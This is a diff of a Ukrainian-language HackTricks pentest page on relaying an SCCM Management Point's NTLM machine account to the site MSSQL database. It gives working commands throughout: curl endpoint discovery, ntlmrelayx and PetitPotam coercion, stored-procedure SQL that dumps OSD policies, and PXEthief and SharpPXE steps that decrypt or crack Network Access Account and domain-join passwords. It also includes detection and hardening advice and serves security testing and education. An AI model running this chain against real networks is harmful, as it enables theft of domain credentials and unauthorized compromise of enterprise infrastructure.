@@ -3,39 +3,39 @@
 {{#include ../../banners/hacktricks-training.md}}
 
 ## TL;DR
-Примусивши **System Center Configuration Manager (SCCM) Management Point (MP)** автентифікуватися через SMB/RPC і **relaying** цей NTLM машинний обліковий запис до **site database (MSSQL)**, ви отримуєте права `smsdbrole_MP` / `smsdbrole_MPUserSvc`. Ці ролі дозволяють викликати набір збережених процедур, які повертають бінарні політики **Operating System Deployment (OSD)** (облікові дані Network Access Account, змінні Task-Sequence тощо). Ці блоби закодовані у hex/зашифровані, але їх можна розкодувати та розшифрувати за допомогою **PXEthief**, отримавши відкриті тексти секретів.
+Примусивши **System Center Configuration Manager (SCCM) Management Point (MP)** автентифікуватися через SMB/RPC і виконавши **relay** цього NTLM облікового запису комп'ютера до **site database (MSSQL)**, ви отримуєте права `smsdbrole_MP` / `smsdbrole_MPUserSvc`. Ці ролі дають змогу викликати набір збережених процедур, які розкривають блоби політик **Operating System Deployment (OSD)** (облікові дані Network Access Account, змінні Task-Sequence тощо). Блоби закодовані в hex та зашифровані, але їх можна декодувати й розшифрувати за допомогою **PXEthief**, отримавши секрети у відкритому вигляді.
 
-Загальний ланцюжок:
-1. Виявити MP і site DB ↦ неавторизований HTTP-ендпоінт `/SMS_MP/.sms_aut?MPKEYINFORMATIONMEDIA`.
+Ланцюжок на високому рівні:
+1. Виявити MP і site DB ↦ неавтентифікована HTTP endpoint `/SMS_MP/.sms_aut?MPKEYINFORMATIONMEDIA`.
 2. Запустити `ntlmrelayx.py -t mssql://<SiteDB> -ts -socks`.
-3. Примусити MP до аутентифікації, використовуючи **PetitPotam**, PrinterBug, DFSCoerce тощо.
-4. Через SOCKS-проксі підключитися за допомогою `mssqlclient.py -windows-auth` від імені ретрансльованого облікового запису **<DOMAIN>\\<MP-host>$**.
+3. Примусити MP за допомогою **PetitPotam**, PrinterBug, DFSCoerce тощо.
+4. Через SOCKS proxy підключитися за допомогою `mssqlclient.py -windows-auth` як обліковий запис **<DOMAIN>\\<MP-host>$**, на який виконано relay.
 5. Виконати:
 * `use CM_<SiteCode>`
 * `exec MP_GetMachinePolicyAssignments N'<UnknownComputerGUID>',N''`
 * `exec MP_GetPolicyBody N'<PolicyID>',N'<Version>'`   (або `MP_GetPolicyBodyAfterAuthorization`)
-6. Видалити `0xFFFE` BOM, `xxd -r -p` → XML → `python3 pxethief.py 7 <hex>`.
+6. Видалити BOM `0xFFFE`, виконати `xxd -r -p` → XML → `python3 pxethief.py 7 <hex>`.
 
-Секрети, такі як `OSDJoinAccount/OSDJoinPassword`, `NetworkAccessUsername/Password` тощо, відновлюються без взаємодії з PXE або клієнтами.
+Такі секрети, як `OSDJoinAccount/OSDJoinPassword`, `NetworkAccessUsername/Password` тощо, можна отримати без взаємодії з PXE або клієнтами.<sup>[[1]](#references)[[3]](#references)</sup>
 
 ---
 
-## 1. Перелі́к неавторизованих ендпоінтів MP
-Розширення ISAPI MP — **GetAuth.dll** відкриває кілька параметрів, що не вимагають автентифікації (якщо сайт не PKI-only):
+## 1. Перелік неавтентифікованих MP endpoint
+Розширення MP ISAPI **GetAuth.dll** відкриває кілька параметрів, які не потребують автентифікації (якщо сайт не працює лише в режимі PKI):<sup>[[1]](#references)</sup>
 
-| Параметр | Призначення |
+| Parameter | Purpose |
 |-----------|---------|
-| `MPKEYINFORMATIONMEDIA` | Повертає публічний ключ сертифіката підпису сайту + GUIDи пристроїв *x86* / *x64* **All Unknown Computers**. |
-| `MPLIST` | Повертає список усіх Management-Point у сайті. |
-| `SITESIGNCERT` | Повертає сертифікат підпису Primary-Site (дозволяє ідентифікувати site server без LDAP). |
+| `MPKEYINFORMATIONMEDIA` | Повертає відкритий ключ сертифіката підпису сайту та GUID пристроїв *x86* / *x64* **All Unknown Computers**. |
+| `MPLIST` | Перелічує всі Management-Point у сайті. |
+| `SITESIGNCERT` | Повертає сертифікат підпису Primary-Site (для ідентифікації site server без LDAP). |
 
-Витягніть GUIDи, які будуть виконувати роль **clientID** для подальших запитів до БД:
+Отримайте GUID, які надалі використовуватимуться як **clientID** для запитів до DB:
 ```bash
 curl http://MP01.contoso.local/SMS_MP/.sms_aut?MPKEYINFORMATIONMEDIA | xmllint --format -
 ```
 ---
 
-## 2. Relay обліковий запис машини MP на MSSQL
+## 2. Relay облікового запису машини MP до MSSQL
 ```bash
 # 1. Start the relay listener (SMB→TDS)
 ntlmrelayx.py -ts -t mssql://10.10.10.15 -socks -smb2support
@@ -44,44 +44,44 @@ ntlmrelayx.py -ts -t mssql://10.10.10.15 -socks -smb2support
 python3 PetitPotam.py 10.10.10.20 10.10.10.99 \
 -u alice -p P@ssw0rd! -d CONTOSO -dc-ip 10.10.10.10
 ```
-Коли примус спрацює, ви повинні побачити щось на кшталт:
+Коли спрацює coercion, ви повинні побачити щось на кшталт:
 ```
 [*] Authenticating against mssql://10.10.10.15 as CONTOSO/MP01$ SUCCEED
 [*] SOCKS: Adding CONTOSO/MP01$@10.10.10.15(1433)
 ```
 ---
 
-## 3. Ідентифікуйте політики OSD за допомогою збережених процедур
-Підключіться через SOCKS proxy (порт 1080 за замовчуванням):
+## 3. Визначення OSD policies через stored procedures
+Підключіться через SOCKS proxy (порт 1080 за замовчуванням):<sup>[[1]](#references)</sup>
 ```bash
 proxychains mssqlclient.py CONTOSO/MP01$@10.10.10.15 -windows-auth
 ```
-Переключіться на **CM_<SiteCode>** DB (використайте 3-значний код сайту, напр. `CM_001`).
+Перейдіть до БД **CM_<SiteCode>** (використовуйте 3-значний код сайту, наприклад `CM_001`).
 
-### 3.1  Знайти Unknown-Computer GUIDs (необов'язково)
+### 3.1  Пошук GUID невідомих комп’ютерів (необов’язково)
 ```sql
 USE CM_001;
 SELECT SMS_Unique_Identifier0
 FROM dbo.UnknownSystem_DISC
 WHERE DiscArchKey = 2; -- 2 = x64, 0 = x86
 ```
-### 3.2  Перелік призначених політик
+### 3.2  Список призначених політик
 ```sql
 EXEC MP_GetMachinePolicyAssignments N'e9cd8c06-cc50-4b05-a4b2-9c9b5a51bbe7', N'';
 ```
-Кожен рядок містить `PolicyAssignmentID`, `Body` (hex), `PolicyID`, `PolicyVersion`.
+Кожен рядок містить `PolicyAssignmentID`,`Body` (hex), `PolicyID`, `PolicyVersion`.
 
-Зосередьтесь на політиках:
+Зосередьтеся на політиках:
 * **NAAConfig**  – облікові дані Network Access Account
 * **TS_Sequence** – змінні Task Sequence (OSDJoinAccount/Password)
-* **CollectionSettings** – може містити run-as accounts
+* **CollectionSettings** – може містити облікові записи run-as
 
-### 3.3  Отримати повне тіло
-Якщо ви вже маєте `PolicyID` & `PolicyVersion`, ви можете пропустити вимогу clientID, використавши:
+### 3.3 Отримання повного body
+Якщо у вас уже є `PolicyID` і `PolicyVersion`, вимогу щодо clientID можна пропустити, використавши:
 ```sql
 EXEC MP_GetPolicyBody N'{083afd7a-b0be-4756-a4ce-c31825050325}', N'2.00';
 ```
-> ВАЖЛИВО: У SSMS збільшіть “Maximum Characters Retrieved” (>65535), інакше blob буде обрізано.
+> ВАЖЛИВО: У SSMS збільште параметр “Maximum Characters Retrieved” (>65535), інакше blob буде обрізано.
 
 ---
 
@@ -102,18 +102,18 @@ NetworkAccessPassword: P4ssw0rd123
 ```
 ---
 
-## 5. Відповідні ролі та процедури SQL
-Після relay логін відображається як:
+## 5. Відповідні SQL-ролі та процедури
+Після relay логін зіставляється з:<sup>[[1]](#references)</sup>
 * `smsdbrole_MP`
 * `smsdbrole_MPUserSvc`
 
-Ці ролі надають десятки дозволів EXEC; ключові, що використовуються в цій атаці, такі:
+Ці ролі надають десятки дозволів EXEC; основні з них, що використовуються в цій атаці:
 
-| Збережена процедура | Призначення |
+| Stored Procedure | Призначення |
 |------------------|---------|
 | `MP_GetMachinePolicyAssignments` | Перелік політик, застосованих до `clientID`. |
-| `MP_GetPolicyBody` / `MP_GetPolicyBodyAfterAuthorization` | Повертає повне тіло політики. |
-| `MP_GetListOfMPsInSiteOSD` | Повертається через шлях `MPKEYINFORMATIONMEDIA`. |
+| `MP_GetPolicyBody` / `MP_GetPolicyBodyAfterAuthorization` | Повернення повного тіла політики. |
+| `MP_GetListOfMPsInSiteOSD` | Повертається шляхом `MPKEYINFORMATIONMEDIA`. |
 
 Повний список можна переглянути за допомогою:
 ```sql
@@ -126,44 +126,44 @@ AND  pe.permission_name='EXECUTE';
 ```
 ---
 
-## 6. PXE boot media harvesting (SharpPXE)
-* **PXE reply over UDP/4011**: надішліть запит PXE boot до Distribution Point, налаштованого для PXE. Відповідь proxyDHCP розкриває шляхи завантаження, такі як `SMSBoot\\x64\\pxe\\variables.dat` (зашифрована конфігурація) та `SMSBoot\\x64\\pxe\\boot.bcd`, а також опціональний зашифрований key blob.
-* **Retrieve boot artifacts via TFTP**: використайте повернуті шляхи, щоб завантажити `variables.dat` через TFTP (без автентифікації). Файл невеликий (кілька КБ) і містить зашифровані змінні медіа.
-* **Decrypt or crack**:
-- Якщо відповідь містить ключ дешифрування, передайте його в **SharpPXE**, щоб розшифрувати `variables.dat` безпосередньо.
-- Якщо ключ не надано (PXE media захищені кастомним паролем), SharpPXE генерує **Hashcat-compatible** `$sccm$aes128$...` хеш для офлайн-крейкінгу. Після відновлення пароля розшифруйте файл.
-* **Parse decrypted XML**: у відкритому вигляді змінні містять метадані розгортання SCCM (**Management Point URL**, **Site Code**, GUIDи медіа та інші ідентифікатори). SharpPXE парсить їх і виводить готову до запуску команду **SharpSCCM** з попередньо заповненими параметрами GUID/PFX/site для подальшого зловмисного використання.
-* **Requirements**: потрібна лише мережна досяжність до PXE listener (UDP/4011) та TFTP; локальні права адміністратора не потрібні.
+## 6. Збір завантажувальних PXE-носіїв (SharpPXE)
+* **Відповідь PXE через UDP/4011**: надішліть запит на завантаження PXE до Distribution Point, налаштованого для PXE. Відповідь proxyDHCP розкриває шляхи до файлів завантаження, зокрема `SMSBoot\\x64\\pxe\\variables.dat` (зашифрована конфігурація) і `SMSBoot\\x64\\pxe\\boot.bcd`, а також необов'язковий зашифрований blob ключа.<sup>[[4]](#references)</sup>
+* **Отримання артефактів завантаження через TFTP**: використайте отримані шляхи, щоб завантажити `variables.dat` через TFTP (без автентифікації). Файл невеликий (кілька КБ) і містить зашифровані змінні носія.
+* **Розшифрування або crack**:
+- Якщо відповідь містить ключ розшифрування, передайте його до **SharpPXE**, щоб безпосередньо розшифрувати `variables.dat`.
+- Якщо ключ не надано (PXE-носій захищений власним паролем), SharpPXE генерує hash у форматі, сумісному з **Hashcat**, — `$sccm$aes128$...` — для offline cracking. Після відновлення пароля розшифруйте файл.
+* **Аналіз розшифрованого XML**: змінні у відкритому вигляді містять метадані розгортання SCCM (**URL Management Point**, **код сайту**, GUID носіїв та інші ідентифікатори). SharpPXE аналізує їх і виводить готову до запуску команду **SharpSCCM** із попередньо заповненими параметрами GUID/PFX/сайту для подальшого зловживання.
+* **Вимоги**: потрібна лише мережева доступність PXE listener (UDP/4011) і TFTP; локальні привілеї адміністратора не потрібні.
 
 ---
 
-## 7. Detection & Hardening
-1. **Monitor MP logins** – будь-який обліковий запис комп'ютера MP, що виконує вхід з IP, який не є його хостом ≈ relay.
+## 7. Виявлення та посилення захисту
+1. **Моніторинг входів до MP** – будь-який вхід облікового запису комп'ютера MP з IP-адреси, яка не належить його хосту, ≈ relay.<sup>[[1]](#references)</sup>
 2. Увімкніть **Extended Protection for Authentication (EPA)** для бази даних сайту (`PREVENT-14`).
-3. Вимкніть невикористовуваний NTLM, забезпечте примусове підписування SMB, обмежте RPC (ті самі міри, що застосовуються проти `PetitPotam`/`PrinterBug`).
-4. Посиліть захист зв'язку MP ↔ DB за допомогою IPSec / mutual-TLS.
-5. **Constrain PXE exposure** – фаєрвольте UDP/4011 і TFTP до довірених VLAN, вимагайте PXE-паролі та налаштуйте сповіщення про завантаження через TFTP файлу `SMSBoot\\*\\pxe\\variables.dat`.
+3. Вимкніть невикористовуваний NTLM, увімкніть обов'язкове SMB signing, обмежте RPC (
+ті самі заходи, що використовуються проти `PetitPotam`/`PrinterBug`).
+4. Посильте захист комунікації MP ↔ DB за допомогою IPSec / взаємного TLS.
+5. **Обмежте доступність PXE** – обмежте firewall-ом UDP/4011 і TFTP довіреними VLAN, вимагайте паролі PXE та створюйте сповіщення про завантаження через TFTP файлів `SMSBoot\\*\\pxe\\variables.dat`.<sup>[[4]](#references)</sup>
 
 ---
 
-## See also
-* NTLM relay fundamentals:
+## Див. також
+* Основи NTLM relay:
 
 {{#ref}}
 ../ntlm/README.md
 {{#endref}}
 
-* MSSQL abuse & post-exploitation:
+* Зловживання MSSQL та post-exploitation:
 
 {{#ref}}
 abusing-ad-mssql.md
 {{#endref}}
 
+## Посилання
+- [1] [Я хочу поговорити з вашим Manager: викрадення секретів за допомогою Management Point Relays](https://specterops.io/blog/2025/07/15/id-like-to-speak-to-your-manager-stealing-secrets-with-management-point-relays/)
+- [2] [PXEthief](https://github.com/MWR-CyberSec/PXEThief)
+- [3] [Misconfiguration Manager – ELEVATE-4 та ELEVATE-5](https://github.com/subat0mik/Misconfiguration-Manager)
+- [4] [SharpPXE](https://github.com/leftp/SharpPXE)
 
-
-## References
-- [I’d Like to Speak to Your Manager: Stealing Secrets with Management Point Relays](https://specterops.io/blog/2025/07/15/id-like-to-speak-to-your-manager-stealing-secrets-with-management-point-relays/)
-- [PXEthief](https://github.com/MWR-CyberSec/PXEThief)
-- [Misconfiguration Manager – ELEVATE-4 & ELEVATE-5](https://github.com/subat0mik/Misconfiguration-Manager)
-- [SharpPXE](https://github.com/leftp/SharpPXE)
 {{#include ../../banners/hacktricks-training.md}}
